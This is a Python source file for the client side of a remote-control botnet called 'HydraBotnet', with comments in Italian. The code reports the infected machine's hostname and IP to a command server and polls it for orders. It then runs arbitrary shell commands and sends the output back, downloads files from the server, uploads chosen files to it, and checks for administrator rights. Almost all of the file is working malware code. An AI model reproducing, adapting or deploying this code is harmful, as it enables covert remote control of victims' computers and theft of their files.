#-*- coding: utf-8 -*-
#!/usr/bin/env python
# HydraBotnet v1.0.5.0 [client_side]
# Author: Malcolm Mami
# Tested and working on python 3.10.0
Requests main page:
import requests
import time
import socket
import subprocess
import threading
import os
import os.path
import ctypes
from datetime import datetime
import wget

# Indirizzo host
hostaddr = 'http://127.0.0.1:8080'

# Parametri tentitivi di riconnessione
clock = 0
wait_time = 0
short_time = 10 # 10 secs
mid_time = 120  # 2 mins
long_time = 600 # 15 mins
decoding = ('ascii')
#decoding = ('utf-8')

def get_machinename():        
    hostname = socket.gethostname()
    ip_addr = socket.gethostbyname(hostname)
    return hostname, ip_addr    

def thread_command(command):

    cmd = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    
    st_out_read = cmd.stdout.read().decode(decoding, 'ignore')
    st_err_read = cmd.stderr.read().decode(decoding, 'ignore')
    
    if not st_out_read:
        # il comando ha dato errore
        output_result = ('R3SU'+st_err_read) # standard output (error)
    else:
        # nessun errore
        output_result = ('R3SU'+st_out_read) # standard output
        
    post_resp = requests.post(url=hostaddr, data=output_result)


def thread_subprocess_command(td_command):
    subprocess.Popen(td_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)


def time_clock():
    return datetime.now().strftime("%H:%M:%S")

def isUserAdmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        traceback.print_exc()
        print("Admin check failed, assuming not an admin.")
        return False

def main_loop():
    while True:    
        try:
            req = requests.post(url=hostaddr, data= '@~id'+hostname+'~'+ip_addr)
            command = req.text
            
            clock = 0
            wait_time = short_time
            
            if 'continue_sleep' in command:
                time.sleep(wait_time)
            
            elif 'quit' in command:
                post_resp = requests.post(url=hostaddr, data='C0NN_CL0SE')
                requests.close()
                
            elif '8#NULLBYT30$' in command:
                post_resp = requests.post(url=hostaddr, data='C0NNW41T')
                
            elif '14Y0KS74RTD0WNL0' in command:            
                url = (hostaddr + '/store')
                
                with open(rawfileName, 'rb') as f:
                    r = requests.post(url, files={'file': f})
                    
                post_resp = requests.post(url=hostaddr, data='1036FGTUSOL1029V') # msg di invio file completato
            
                
            elif command.startswith('3NTERC0M'):
                # taglio della stringa comando
                command = command[8:]            
                # ---------------------------------------
                # SUB-LOOP di conversazione con il server
                # ---------------------------------------
                # spostarsi tra le directory di sistema
                if command.startswith('cd '):
                    path = command[3:]
                    try:
                        #print(path)
                        os.chdir(path)
                        result = ('-->'+path)
                    except:
                        result = ('Impossibile trovare il percorso specificato.')

                    post_resp = requests.post(url=hostaddr, data=result)
                #
                # -------------------------------------------
                # Gestisce UPLOAD dei file [CLIENT >> SERVER]
                # -------------------------------------------
                elif command.startswith('1n37dT0u'):

                    # controllo prima che il file esista
                    rawFile = command[8:]
                        
                    FileSplitter = rawFile.split('<#>')
                        
                    FileToUploadName = FileSplitter[0] # filename
                    FileDimension = FileSplitter[1] # original bytes dimension                    
                        
                    file_url = (hostaddr + '/' + FileToUploadName)
                    dw = wget.download(file_url) # download file from host
                        
                    # Controllo se il file esiste
                    if os.path.isfile(FileToUploadName):
                        
                        # controlla la sua dimensione in bytes
                        filesz = os.path.getsize(FileToUploadName)
                            
                        # verifico se corrisponde a quella originale
                        if (str(filesz) == FileDimension):
                            # Download riuscito
                            result = (b'Upload completato')
                        else:
                            # Download fallito file incompleto errore
                            result = (b'Errore upload: file incompleto')
                        
                    else: # non esiste
                        result = (b'Errore upload: il file non esiste')
                        
                    post_response = requests.post(url=hostaddr, data=result)
                    
                
                elif command.startswith('admck'):
                    if (isUserAdmin() < 1):
                        result = (b'shell con privilegi standard')
                    else:
                        result = (b'shell con privilegi amministrativi')
                    post_response = requests.post(url=hostaddr, data=result)                    
                
                
                elif command.startswith('exec '):
                    td_command = command[5:]
                    thread_subprocess_command(td_command)
                    
                    result = (b'comando inviato al thread:\ntieni conto che potrebbe non venir eseguito se errato')
                    post_response = requests.post(url=hostaddr, data=result)
                    
                
                elif command.startswith('grab '):
                
                    rawfileName = command[5:]
                    
                    # controllo se il file esiste davvero
                    if os.path.isfile(rawfileName):
                        # esiste
                        # controllo la sua dimensione
                        fileSize = os.path.getsize(rawfileName) # integer                    
                        
                        # invio al server la comunicazione che voglio inviargli il file
                        # deve essere formattato in binario
                        messageToSrvUpload = ('0UPL04DW1LLS74R7'+rawfileName+'<#>'+str(fileSize)) # stringa
                        # conversione da stringa a binario
                        b_message = str.encode(messageToSrvUpload)
                        
                        result = b_message                    
                        
                    else:
                        # file non esiste
                        result = (b'UN945FT20193810V') # esco correttamente
                        
                    post_response = requests.post(url=hostaddr, data=result)            
                
                # ----------------------------------------------------------------
                else:
                    bash_cmd = threading.Thread(target=thread_command, args=(command,))
                    bash_cmd.start()
                    bash_cmd.join()                  
                
            else:
                time.sleep(wait_time)
                
        except:           
            if (clock < 6): # 10s * 6 = 60s
                wait_time = short_time

                clock+=1
            elif (clock < 10): # 2 minuti
                wait_time = mid_time

                clock+=1
            else:              # oltre 15 minuti a blocco
                wait_time = long_time
                
            time.sleep(wait_time)
        

if __name__ == '__main__':
    hostname, ip_addr = get_machinename()
    main_loop()
